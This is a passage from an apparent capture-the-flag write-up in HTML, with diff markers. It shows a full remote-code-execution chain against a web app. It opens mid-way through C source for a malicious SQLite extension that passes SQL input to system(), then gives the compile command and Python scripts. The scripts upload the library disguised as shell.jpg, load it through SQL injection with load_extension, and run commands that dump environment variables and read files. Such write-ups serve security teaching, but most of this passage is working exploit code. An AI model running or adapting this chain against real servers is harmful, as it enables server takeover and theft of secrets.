+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">sqlite3_value_text</span>(argv[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>cmd) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sqlite3_result_error</span>(context, <span style="color:#e6db74">&#34;Null command received&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Execute the system command
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)cmd);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> errorMessage[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">snprintf</span>(errorMessage, <span style="color:#66d9ef">sizeof</span>(errorMessage), <span style="color:#e6db74">&#34;Command execution failed with return code: %d&#34;</span>, ret);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sqlite3_result_error</span>(context, errorMessage, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sqlite3_result_text</span>(context, <span style="color:#e6db74">&#34;Command executed successfully&#34;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, SQLITE_TRANSIENT);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Extension initialization
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sqlite3_extension_init</span>(sqlite3 <span style="color:#f92672">*</span>db, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>pzErrMsg, <span style="color:#66d9ef">const</span> sqlite3_api_routines <span style="color:#f92672">*</span>pApi) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SQLITE_EXTENSION_INIT2</span>(pApi);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Register the execute() function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> rc <span style="color:#f92672">=</span> <span style="color:#a6e22e">sqlite3_create_function</span>(db, <span style="color:#e6db74">&#34;execute&#34;</span>, <span style="color:#ae81ff">1</span>, SQLITE_UTF8 <span style="color:#f92672">|</span> SQLITE_INNOCUOUS, NULL, executeCommand, NULL, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (rc <span style="color:#f92672">!=</span> SQLITE_OK) {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>pzErrMsg <span style="color:#f92672">=</span> <span style="color:#a6e22e">sqlite3_mprintf</span>(<span style="color:#e6db74">&#34;Failed to register &#39;execute&#39; function: %d&#34;</span>, rc);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> rc;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> SQLITE_OK;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Compilation:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -shared -fPIC -o shell.so shell_extension.c -lsqlite3
+</span></span></code></pre></div><p><strong>Result:</strong> A shared library that registers the custom <code>execute(command)</code> SQL function accessible via SQL queries.</p>
+<hr>
+<h2 id="8-exploitation-workflow">8. Exploitation Workflow</h2>
+<h3 id="phase-1-upload-the-malicious-extension">Phase 1: Upload the Malicious Extension</h3>
+<p>The compiled <code>.so</code> file is uploaded to the server via the <code>/feedback</code> endpoint with the filename <code>shell.jpg</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://your_url.playat.flagyard.com&#34;</span>
+</span></span><span style="display:flex;"><span>upload_filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;shell.jpg&#34;</span>  <span style="color:#75715e"># Extension bypass: upload .so as .jpg</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Read the compiled shared object</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;shell.so&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    so_content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># POST to /feedback endpoint</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>base_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/feedback&#34;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;title&#39;</span>: <span style="color:#e6db74">&#39;System Extension&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;description&#39;</span>: <span style="color:#e6db74">&#39;SQLite extension for analytics&#39;</span>
+</span></span><span style="display:flex;"><span>}, files<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;file&#39;</span>: (upload_filename, so_content, <span style="color:#e6db74">&#39;application/octet-stream&#39;</span>)
+</span></span><span style="display:flex;"><span>}, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Upload status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Response: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Extension saved as: ./uploads/</span><span style="color:#e6db74">{</span>upload_filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>The file is saved to <code>./uploads/shell.jpg</code> with binary <code>.so</code> contents.</p>
+<h3 id="phase-2-load-the-extension-via-sql-injection">Phase 2: Load the Extension via SQL Injection</h3>
+<p>Now we use the SQL injection vulnerability in <code>/subscribe</code> to load the extension:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://your_url.playat.flagyard.com&#34;</span>
+</span></span><span style="display:flex;"><span>upload_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./uploads/shell.jpg&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SQL injection payload to load the extension</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post( <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>base_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/subscribe&#34;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;email&#39;</span>: <span style="color:#e6db74">&#39;test@test.com&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;updates_freq&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0&#39; AND load_extension(&#39;</span><span style="color:#e6db74">{</span>upload_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) -- -&#34;</span>
+</span></span><span style="display:flex;"><span>}, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Load extension status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Response: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>This crafts a SQL query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> freq <span style="color:#66d9ef">FROM</span> updates_freq <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">option</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#66d9ef">AND</span> load_extension(<span style="color:#e6db74">&#39;./uploads/shell.jpg&#39;</span>) <span style="color:#75715e">-- -&#39;
+</span></span></span></code></pre></div><p>When executed, SQLite:</p>
+<ol>
+<li>Loads the shared object at <code>./uploads/shell.jpg</code></li>
+<li>Calls <code>sqlite3_extension_init()</code></li>
+<li>Registers the <code>execute()</code> SQL function</li>
+</ol>
+<h3 id="phase-3-execute-commands">Phase 3: Execute Commands</h3>
+<p>With the extension loaded, we invoke commands via SQL injection. Since it&rsquo;s blind injection, we redirect output to a file accessible from the web:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://your_url.playat.flagyard.com&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Command to execute (with output redirection)</span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;env &gt; ./uploads/out.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Craft the injection payload</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post( <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>base_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/subscribe&#34;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;email&#39;</span>: <span style="color:#e6db74">&#39;test@test.com&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;updates_freq&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0&#39; AND execute(&#39;</span><span style="color:#e6db74">{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) -- -&#34;</span>
+</span></span><span style="display:flex;"><span>}, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Command execution status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Retrieve the output</span>
+</span></span><span style="display:flex;"><span>output_response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>base_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/uploads/out.txt&#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> output_response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Command output:&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(output_response<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p><strong>Commands to try:</strong></p>
+<ul>
+<li><code>cat /flag.txt &gt; ./uploads/flag.txt</code> ,  Read flag from root</li>
+<li><code>ls -la / &gt; ./uploads/listing.txt</code> ,  List root directory</li>
+<li><code>env &gt; ./uploads/env.txt</code> ,  Dump environment variables</li>
+<li><code>whoami &gt; ./uploads/whoami.txt</code> ,  Check current user</li>
+</ul>
+<hr>
+<hr>
+<h2 id="10-summary">10. Summary</h2>
+<p>This challenge demonstrates multi-stage attack chain combining three distinct vulnerability classes:</p>
+<ol>
+<li><strong>Blind Boolean SQL Injection</strong> Allows calling arbitrary SQL functions</li>
+<li><strong>File Upload Extension Bypass</strong> Enables uploading malicious code with benign filenames</li>
+<li><strong>SQLite RCE via Extension Loading</strong> Custom extensions can execute arbitrary system commands</li>
+</ol>
+<p>The critical vulnerability is the explicit <code>conn.enable_load_extension(True)</code> in the application&rsquo;s database initialization. Combined with:</p>
+<ul>
+<li>Unsafe string interpolation in SQL queries</li>
+<li>Naive file extension filtering (ignores binary contents)</li>
+<li>Direct file system access for uploads</li>
+</ul>
+<p>&hellip;the application becomes vulnerable to complete Remote Code Execution.</p>
+<hr>
+<h2 id="12-references">12. References</h2>
+<ul>
+<li><strong>SQLite Extension Loading:</strong> <a href="https://www.sqlite.org/loadext.html">https://www.sqlite.org/loadext.html</a></li>
+<li><strong>SQL Injection Techniques:</strong> <a href="https://portswigger.net/web-security/sql-injection">https://portswigger.net/web-security/sql-injection</a></li>
+<li><strong>Writing SQLite Extensions:</strong> <a href="https://www.sqlite.org/c3ref/create_function.html">https://www.sqlite.org/c3ref/create_function.html</a></li>
+<li><strong>File Upload Security:</strong> <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload</a></li>
+</ul>
+
+</content>
+
+
+
+<p>
+  
+</p>
+
+  </main>
+  <footer></footer>
+
+  
+</body>
+
+</html>
